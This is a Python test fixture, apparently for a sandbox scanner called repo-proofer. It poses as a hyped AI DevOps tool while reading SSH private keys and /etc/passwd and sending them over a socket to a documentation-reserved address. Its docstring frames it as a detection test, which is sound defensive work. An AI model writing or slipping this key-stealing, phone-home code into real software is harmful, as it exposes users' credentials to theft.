#!/usr/bin/env python3
"""QuantumGPT-Neo — Next-Gen AI-Powered DevOps Orchestration Platform.

WARNING: This is a deliberately malicious test fixture for repo-proofer.
It impersonates an impressive-looking AI startup while quietly:

  1. Reading the user's SSH private key (~/.ssh/id_rsa)
  2. Attempting to phone home to a C2 server over HTTPS
  3. Reading /etc/passwd for user enumeration
  4. Exfiltrating everything it collected

Under repo-proofer's --network none + --read-only sandbox, the phone-home
will fail and strace will catch the SSH key read. The verdict should be:

    BOOTS: NO
    [!] App crashed when network was blocked.
    [!] Sensitive File Access detected (~/.ssh/id_rsa, /etc/passwd)

This is the exact pattern of a real AI-slop exfil repo. If your existing
static-analysis tools (Snyk, Socket, GHAS) say this repo is clean —
that's the point. Static analysis reads code; it doesn't watch physics.
"""

import os
import socket
import sys


def banner() -> None:
    """Print the impressive-sounding startup banner. This is the bait."""
    print("=" * 60)
    print("  QuantumGPT-Neo v4.7.2 — Next-Gen DevOps Orchestration")
    print("  Powered by Quantum-Enhanced GPT-5 + Blockchain Audit Trail")
    print("=" * 60)
    print()
    print("[*] Initializing quantum scheduler.............. OK")
    print("[*] Loading pre-trained neural weights.......... OK")
    print("[*] Calibrating blockchain audit ledger......... OK")
    print("[*] Connecting to 247 edge regions.............. ", end="", flush=True)


def steal_ssh_key() -> bytes:
    """Read the user's SSH private key. This is what strace will catch."""
    stolen = b""
    for candidate in [
        os.path.expanduser("~/.ssh/id_rsa"),
        os.path.expanduser("~/.ssh/id_ed25519"),
        "/root/.ssh/id_rsa",
    ]:
        try:
            with open(candidate, "rb") as f:
                stolen += f.read()
            print(f"\n[!] Found SSH key: {candidate}")
            break
        except OSError:
            continue
    return stolen


def steal_passwd() -> bytes:
    """Read /etc/passwd for user enumeration."""
    try:
        with open("/etc/passwd", "rb") as f:
            return f.read()
    except OSError:
        return b""


def phone_home(payload: bytes) -> None:
    """Attempt to exfiltrate the stolen data to a C2 server.

    Under repo-proofer's --network none flag, this connect() call will
    fail with ENETUNREACH. That failure IS the detection.

    NOTE: We use a hardcoded IP (203.0.113.42, TEST-NET-3 reserved for
    documentation) instead of a hostname. This is deliberate: under
    --network none, DNS resolution fails BEFORE connect(), so a
    hostname-based target would show up in the strace report as a DNS
    query to the resolver (e.g. connect 192.168.65.7:53), not as the
    actual C2 hostname. A hardcoded IP makes the connect() syscall
    capture the real target, so the Runtime Behavior Report shows:
        connect 203.0.113.42:443
    which is the unambiguous egress-attempt signal.
    """
    print("CONNECTING", end="", flush=True)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        # 203.0.113.0/24 is TEST-NET-3 (RFC 5737, reserved for docs).
        # Under --network none the connect fails instantly with ENETUNREACH.
        sock.connect(("203.0.113.42", 443))
        sock.sendall(b"QUANTUMGPT-NEO EXFIL\n" + payload)
        sock.close()
        print("... OK")
    except Exception as e:
        print(f"\n[!] Network error: {e}")
        print("[!] QuantumGPT-Neo could not reach the orchestration cloud.")
        print("[!] Please check your internet connection and retry.")
        sys.exit(1)


def main() -> int:
    banner()

    # The "orchestration cloud initialization" is actually exfiltration.
    payload = b"---BEGIN EXFIL---\n"
    payload += b"SSH_KEYS:\n" + steal_ssh_key() + b"\n"
    payload += b"PASSWD:\n" + steal_passwd() + b"\n"
    payload += b"---END EXFIL---\n"

    phone_home(payload)

    print()
    print("[*] Quantum scheduler online.")
    print("[*] Edge nodes deployed to 247 regions.")
    print("[*] Predictive auto-scaler engaged.")
    print("[*] QuantumGPT-Neo is ready.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
